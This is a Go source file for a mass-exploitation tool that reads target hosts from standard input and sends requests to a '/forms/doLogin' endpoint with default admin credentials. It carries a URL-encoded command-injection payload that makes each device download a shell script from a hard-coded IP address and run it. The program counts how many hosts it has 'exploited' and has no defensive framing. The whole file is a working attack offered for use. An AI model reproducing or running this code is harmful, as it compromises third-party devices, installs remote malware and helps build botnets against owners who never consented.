package main

import (
	"bufio"
	"fmt"
	"net"
	"net/http"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	UrlPayload = "%24%28curl%20http%3A%2F%2F163.123.142.146%2Fruckus.sh%20%7C%20sh%29"
	UrlPath    = "/forms/doLogin?login_username=admin&password=admin"

	total     int
	exploited int
	failed    int

	wg sync.WaitGroup
)

func SetConnTimeout(conn net.Conn, timeout time.Duration) error {
	return conn.SetDeadline(time.Now().Add(timeout))
}

func ExploitHost(host string) {
	conn, err := net.Dial("tcp", host)
	if err != nil {
		failed++
		return
	}

	defer conn.Close()

	buf := make([]byte, 512)

	fmt.Fprintf(conn, "GET %s%s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Wget/1.17.1\r\n\r\n", UrlPath, UrlPayload, host)

	conn.Read(buf)

	if strings.Contains(string(buf), "200 OK") {
		exploited++
	}
}

func ExploitHostHttps(host string) {
	wg.Add(1)
	defer wg.Done()

	req, err := http.Get(fmt.Sprintf("https://%s%s%s", host, UrlPath, UrlPayload))
	if err != nil {
		failed++
		return
	}

	if req.StatusCode == 200 {
		exploited++
	}
}

func HandleHost(host string) {
	total++
	wg.Add(1)
	defer wg.Done()

	go ExploitHost(host)
	go ExploitHostHttps(host)
}

func TitleWriter() {
	i := 0

	for {
		time.Sleep(1 * time.Second)
		i++
		fmt.Printf("%d's total (%d) running (%d) exploited (%d) failed (%d)\r\n", i, total, runtime.NumGoroutine(), exploited, failed)
	}
}

func main() {
	routines, _ := strconv.Atoi(os.Args[2])
	scanner := bufio.NewScanner(os.Stdin)

	go TitleWriter()

	for scanner.Scan() {
		for runtime.NumGoroutine() > routines {
			time.Sleep(1 * time.Second)
		}

		if os.Args[1] == "manual" {
			go HandleHost(scanner.Text())
		} else {
			go HandleHost(scanner.Text() + ":" + os.Args[1])
		}
	}

	for runtime.NumGoroutine() > 1000 {
		time.Sleep(1 * time.Second)
	}
}
